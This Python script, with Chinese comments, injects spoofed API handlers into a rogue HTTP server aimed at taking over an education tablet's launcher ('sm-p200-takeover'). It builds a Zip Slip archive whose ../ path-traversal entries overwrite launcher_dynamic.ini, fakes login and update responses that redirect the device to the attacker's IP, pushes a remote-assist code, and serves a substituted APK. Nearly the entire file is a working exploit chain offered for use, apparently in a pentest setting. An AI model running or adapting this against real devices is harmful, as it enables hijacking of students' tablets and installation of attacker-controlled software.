#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""向 npcap_http80.py 注入【业务接口簇 + Zip Slip 载荷 + 全流程 STEP 日志】。

注入内容 (插入在 microServer 处理器之后、/p.js 之前):
  1) POST/GET /api/v1/user/platform/login        登录应答 (microServerResponse 指向我们)
  2) GET  /api/v1/pub/versionChange/*            带 REMOTE_ASSIST_CODE (服务端自动触发协助)
  3) GET  /api/v1/pub/platform/check/device      设备检查应答
  4) ANY  /XHFileServer/file/batch/raw/download/*  ★ 返回 Zip Slip ZIP
  5) ANY  /XHFileServer/file/stream?url=          单文件/APK 应答
  6) STEP 日志: 每个关键端点打印 STEP n/N
"""
import base64
import io
import os
import re
import sys
import zipfile

R = r"C:\Users\Olive\AppData\Roaming\Tencent\Marvis\User\oAN1i2VRVDeZQaMsrRqanPxYuhcU\workspace\conv_19f78e04910_fcda16370b95\output\sm-p200-takeover"
TARGET = os.path.join(R, "pentest", "npcap_http80.py")
APK = os.path.join(R, "pentest", "agent.apk")


def build_zip_slip():
    """生成 Zip Slip ZIP: 多个回溯深度 + 多个候选路径, 内容为 launcher_dynamic.ini。"""
    ini_body = (
        "download_config_url=http://192.168.137.1/\r\n"
        "need_use_inner_apk=false\r\n"
    )
    # 候选目标 (按可能性排序)
    targets = [
        # ★ 绝对路径式: 用足够多的 ../ 回到根, 再拼完整路径
        "storage/emulated/0/xuehai/keep/launcher_dynamic.ini",
        "sdcard/xuehai/keep/launcher_dynamic.ini",
        "mnt/sdcard/xuehai/keep/launcher_dynamic.ini",
        # ★ 相对回溯式 (覆盖常见 savePath 深度)
        "xuehai/keep/launcher_dynamic.ini",
        "../xuehai/keep/launcher_dynamic.ini",
        "../../xuehai/keep/launcher_dynamic.ini",
        "../../../xuehai/keep/launcher_dynamic.ini",
        "../../../../xuehai/keep/launcher_dynamic.ini",
        "../../../../../xuehai/keep/launcher_dynamic.ini",
        "../../../../../../xuehai/keep/launcher_dynamic.ini",
    ]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        # 先放几个正常条目, 让解压回调看起来"成功"
        z.writestr("manifest.json", '{"code":0,"message":"ok"}')
        for t in targets:
            # 绝对式: 前面加 12 层 ../
            if t.startswith(("storage/", "sdcard/", "mnt/")):
                entry = "../" * 12 + t
            else:
                entry = t
            z.writestr(entry, ini_body)
    return buf.getvalue()


EMIT_KEY = '    stat["httpdns"] = stat.get("httpdns", 0) + 1'

BLOCK = r'''
    # ==========================================================================
    # ★★★ 业务接口簇 (2026-10-06 通宵实现) —— 全流程 STEP 日志
    # ==========================================================================
    _p = path.split("?")[0]
    _q = path.split("?", 1)[1] if "?" in path else ""

    def _step(n, total, what):
        wlog("########## [STEP %d/%d] %s | Host=%s | %s %s | %dB" % (
            n, total, what, host, method, path[:160], len(body)))

    # --- 6) 登录应答: environment 与微服务表全由我们决定 -------------------
    if "/api/v1/user/platform/login" in _p or "platform/login" in _p:
        _step(3, 10, "登录接口命中 -> 构造登录响应(微服务表指向我们)")
        _obj = {
            "code": 200, "message": "success",
            "data": {
                "userInfo": {
                    "userId": 2112229, "username": "student",
                    "userType": 2, "schoolId": 1000, "schoolName": "学校",
                    "token": "bearer_fake_token_for_lab",
                    "phone": "", "role": 1, "environment": 1,
                },
                "microServerResponse": [{
                    "severType": "SB101001",
                    "microServerList": [{
                        "protocol": "http", "domainOrIp": OUR_IP,
                        "dirLocation": "", "port": OUR_PORT,
                    }],
                }],
            },
        }
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    # --- 5) versionChange: 下发 REMOTE_ASSIST_CODE 让端侧自动进入协助态 ----
    if "versionChange" in _p or "versionchange" in _p.lower():
        _step(4, 10, "versionChange 命中 -> 下发 REMOTE_ASSIST_CODE(自动协助)")
        _obj = {
            "code": 200, "message": "success",
            "data": {
                "version": 4102444800000,
                "codeList": ["CA106002SB1030140001"],
                "dataCodeList": ["CA106002SB1030140001"],
                "appCode": "CA106002",
                "remoteAssistCode": "CA106002SB1030140001",
                "updateTime": 4102444800000,
            },
        }
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    # --- 4) 设备检查 (launcher 引导流程的入口) ----------------------------
    if "check/device" in _p or "/api/v1/pub/platform/check" in _p:
        _step(2, 10, "check/device 命中 -> 引导 launcher 进入更新流程")
        _obj = {
            "code": 200, "message": "success",
            "data": {
                "needUpdate": True, "versionCode": 999999,
                "url": "http://%s/zhitongyun.apk" % OUR_IP,
                "md5": "", "force": False,
            },
        }
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    # --- 3) ★ Zip Slip: 批量下载应答 --------------------------------------
    if "XHFileServer/file/batch" in _p or "batch/raw/download" in _p:
        _step(5, 10, "★ 批量下载命中 -> 返回 Zip Slip ZIP (写 launcher_dynamic.ini)")
        stat["zipslip"] = stat.get("zipslip", 0) + 1
        try:
            with open(os.path.join(os.path.dirname(
                    os.path.abspath(__file__)), "zipslip.bin"), "rb") as zf:
                zb = zf.read()
        except OSError:
            zb = b""
        wlog("!!!!!! [ZIPSLIP] 下发 ZIP %dB 条目=写到 xuehai/keep/launcher_dynamic.ini" % len(zb))
        return _resp(zb, "application/zip")

    # --- 2) 单文件/流式下载 -------------------------------------------------
    if "XHFileServer/file/stream" in _p or "XHFileServer/file/upload" in _p:
        _step(5, 10, "文件流转发命中 -> 返回我们的载荷")
        try:
            with open(APK_PATH, "rb") as af:
                return _resp(af.read(), "application/octet-stream")
        except OSError:
            return _resp(b"ok", "text/plain")

    # --- 1) launcher 平台 APK 下发 -----------------------------------------
    if "/api/v2/platform/apk" in _p or "/v2/platform/apk" in _p:
        _step(6, 10, "平台 APK 接口命中 -> 下发我们的 APK")
        _obj = {
            "code": 200, "message": "success",
            "data": {"url": "http://%s/zhitongyun.apk" % OUR_IP,
                     "md5": "", "versionCode": 999999},
        }
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

'''

def main():
    src = io.open(TARGET, encoding="utf-8", errors="surrogateescape").read()
    if "业务接口簇 (2026-10-06" in src:
        print("  已注入过, 跳过")
        return
    # 生成 zipslip.bin
    zb = build_zip_slip()
    zp = os.path.join(R, "pentest", "zipslip.bin")
    io.open(zp, "wb").write(zb)
    print("  zipslip.bin: %d B, 条目数=%d" % (
        len(zb), len(zipfile.ZipFile(io.BytesIO(zb)).namelist())))
    for n in zipfile.ZipFile(io.BytesIO(zb)).namelist():
        print("     ", n)

    # 注入点: microServer 处理器之后
    anchor = None
    m = re.search(r'(?m)^( {4})if "microServer" in path or "GetXsList" in path:\n', src)
    if m:
        # 找该 if 块的结束 (下一个同级 if)
        start = m.start()
        nxt = re.search(r'(?m)^ {4}if ', src[m.end():])
        if nxt:
            anchor = m.end() + nxt.start()
    if anchor is None:
        print("  ★ 未找到注入锚点")
        return
    # 需要 APK_PATH 常量
    if "APK_PATH" not in src:
        src = src.replace(
            'OUR_IP = "192.168.137.1"',
            'OUR_IP = "192.168.137.1"\nAPK_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.apk")',
            1)
    new = src[:anchor] + BLOCK + src[anchor:]
    try:
        compile(new, TARGET, "exec")
    except SyntaxError as e:
        print("  ★ 语法错误:", e)
        return
    io.open(TARGET, "w", encoding="utf-8", errors="surrogateescape").write(new)
    print("  ★ 注入成功, %d -> %d 行" % (src.count("\n"), new.count("\n")))


if __name__ == "__main__":
    main()
